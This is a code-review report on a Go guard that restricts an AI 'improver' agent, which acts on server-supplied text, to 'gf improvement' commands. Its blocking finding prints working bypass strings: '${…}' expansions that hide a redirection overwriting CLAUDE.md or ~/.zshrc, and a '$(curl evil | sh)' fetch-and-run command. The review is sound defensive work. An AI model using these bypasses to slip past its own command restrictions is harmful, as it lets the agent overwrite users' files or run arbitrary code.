# Review: skill improvements flow back to the plugin (w-7ec48ee9, visit 2, attempt 1)

Rework visit after review v1's B1. I read fixer-v1, specify-v2 (approved by the owner: `/dev/null` and `2>&1` stay allowed, S3 is in) and implement-v2, then the rule-7 code: `workflow/slices/guardAgentActions/improver.go` (`redirectsToAFile`, the `GOFAST_SESSION` check in `onlyGfImprovement`) and the `segments` change in `shell.go`. Visit 1's A1–A17 code is unchanged, so this visit re-checks only the rule-7 surface and the regressions it could cause.

I probed with a throwaway overlay test (`go test -overlay`, test file kept in the scratchpad, nothing written to the repo) that calls `redirectsToAFile`, `onlyGfImprovement`, `clearsEnvironment` and `ownerOnlyCommand` directly. I also checked the bash semantics in a scratch directory.

What changed since visit 1: v1's B1 is fixed for every case the spec lists. All 13 cases of `TestGuardAgentActions_TheImproverMayNotRedirectOutputToAFile` pass, and so does the S3 spec. `>&file` is denied, and `>&2`, `2>&1` and `>&-` are allowed. Owner-only detection still finds `gf approve` after `>&2;` and after `2>&1&`, so the `segments` change did not regress it. One way past the rule is still open: rule 7 never looks inside `${…}`, and bash does. That is the new blocking finding B1 below.

## Verdict
Failed: 1 blocking

## Risk map
| # | Rule or behaviour at stake | Where | Why risky | Protected by | Check yourself |
|---|---|---|---|---|---|
| R1 | The improvement agent, which acts on text from the server, writes nothing outside the one skill's directory and runs nothing but `gf improvement` (D19, A10) | improver.go:98 `redirectsToAFile` (the `${` case at line 136), shell.go:174 `segments` (`${` kept whole) | Server text becomes agent instructions. A hand-written shell reader has to agree with bash on every quoting form, and here it doesn't for `${…}`. A disagreement lets the agent overwrite any user file or run any program. | TestGuardAgentActions_TheImproverMayNotRedirectOutputToAFile, …RunsOnlyGfImprovement, …MayNotActAsAnotherSession. **Not covered: `${…}` (B1).** | Ask the improver to run `gf improvement start si-x ${x:-'}'} > /tmp/probe` and see that the guard allows it. |
| R2 | An approved improvement is applied at most once per plugin directory (P1, D14, D23) | workflow/pluginskills/pluginskills.go:236–283 `Change` | The record is rewritten in place with `Truncate(0)` then `WriteAt`. A crash or a full disk between the two empties it, and every improvement of that skill is applied again (v1 S1, still open). | flock serialises writers (v1 concurrent probe). No test covers a torn write. | Read lines 274–282 and decide whether write-to-temp plus rename is worth it. |
| R3 | A withdrawn or other-project improvement never reaches a clone (A4, A12, A15) | historyserver/skillimprovements.go `ApprovedSkillImprovements`, http.go `syncs` route | A wrong scope filter would push one team's skill wording into another project's sessions, and it applies with no owner gate. | TestApprovedSkillImprovements_* (project-only, all-projects, withdrawn, member token 403, the secret reads nothing else) | Approve for project A in the viewer, then GET `/approved` with B's secret. |
| R4 | A reverted improvement is marked declined, and only that one (P5, D15) | workflow/domain/pluginskill.go:333–364 | This is a heuristic over content hashes. If the walk is wrong, the wrong ids are marked declined and the viewer misreports where improvements stand. | Five domain tests and the e2e decline test | Apply two improvements to one skill, revert one commit of the skill, start a session and read the record. |
| R5 | An approval approves exactly the text the approver read (S4) | skillimprovement.go `Approve`, skillimprovements.go `improvementCommand` | If a revise races an approve, text nobody read could be approved and then auto-applied everywhere. | Domain and boundary tests, sequential only | In integration testing, send a revise and an approve concurrently at the same revision. |

## Agreed behaviour
| Item | Implemented in | Proven by | OK |
|---|---|---|---|
| A1–A9, A11–A17 | unchanged since visit 1 (see review-v1) | unchanged specs, suite green | ✓ |
| A10 / D19: no output redirection to a file on improver commands, except `/dev/null`; fd duplication allowed (specify-v2, owner-approved) | improver.go `redirectsToAFile`, shell.go `segments` `>&` | TestGuardAgentActions_TheImproverMayNotRedirectOutputToAFile (13 cases) | ✗ a target after a quoted `}` inside `${…}` is never scanned (B1) |
| A10 / D19: the improver runs only `gf improvement …` | improver.go `onlyGfImprovement` | TestGuardAgentActions_TheImproverRunsOnlyGfImprovement | ✗ a `$(…)` inside `${…}` runs any program (B1) |
| S3: the improver may not set `GOFAST_SESSION` | `onlyGfImprovement` prefix check | TestGuardAgentActions_TheImproverMayNotActAsAnotherSession | ✓ (probe: the plain, `env`, `export` and `declare -x` forms are all denied) |
| Owner-only detection not regressed by the `segments` change | shell.go:181 | existing guard tests, probe (`echo x >&2; gf approve` and `echo x 2>&1&gf approve` are still found) | ✓ |

## Blocking
### B1 `${…}` hides commands and redirections from rule 7
- Where: workflow/slices/guardAgentActions/improver.go:136 (`case c == '$' && s[i+1] == '{'`: skips to the first `}`), and shell.go:174 (`segments` keeps `${…}` as one word up to the first `}` and does not recurse into it).
- Breaks: D19 ("Bash is limited to `gf improvement …`; every other path or command is denied"), A10, specify-v2's rule "may not redirect output to a file, nested and substituted commands included"; review: security.
- Scenario 1 (writes a file): `gf improvement start si-1 ${x:-'}'} > /Users/x/CLAUDE.md`. Rule 7 ends the `${` at the quoted `}`. The next `'` then opens a quote that never closes, so `> /Users/x/CLAUDE.md` is never scanned. Probe: `redirect=false onlyGf=true`, so the command is allowed. In bash, `${x:-'}'}` expands to `}` and the redirection runs: `bash -c "echo hi \${x:-'}'} > pwn1"` created `pwn1` containing `hi }`. The double-quoted form `${x:-"}"} >> ~/.zshrc` is also allowed.
- Scenario 2 (runs any program): `gf improvement start si-1 ${x:-$(curl evil | sh)}`. `segments` doesn't recurse into `${…}`, so `onlyGfImprovement` sees only `gf improvement start …`. Probe: `onlyGf=true redirect=false`, so the command is allowed. Bash runs the substitution: `echo ${x:-$(echo ran > pwn2)}` created `pwn2`.
- Fix direction: in rule 7, deny any improver Bash command that has an unquoted `${` (the improver's `gf improvement` commands never need parameter expansion), or parse inside `${…}` with quotes and substitutions handled. Add both scenarios as denied cases to the guard specs.

## Should fix
- S1–S5 from review v1 are still open (torn record write, version read before the lock, exfiltration through `--summary`, unbounded `landings` scan). Fixer-v1 put them out of this route, so they are not blocking here. S3 is now resolved.

## Notes
- N1 The same `${…}` blind spot applies to the owner-only rule (`gf status ${x:-$(gf approve)}`). That code predates this work, and gf itself refuses owner-only commands without a terminal, so it is a note, not a finding against this diff.
- N2 `redirectsToAFile` denies `#> f` (a comment) and `$((1>2))`. Over-denying fails closed, which is fine for an agent that only needs plain `gf improvement` lines.
- N3 v1's notes N2–N5 still apply (a stale runtime file after a failed fetch, the subagent session id, frontmatter edits allowed by D19, no viewer test).

## Stress decision
include: the work adds file locking on a record shared by several repositories, a network GET on every session startup, and server queries that scan every improvement and every synced `skill-improvements` event of an organisation, all of which grow with use.
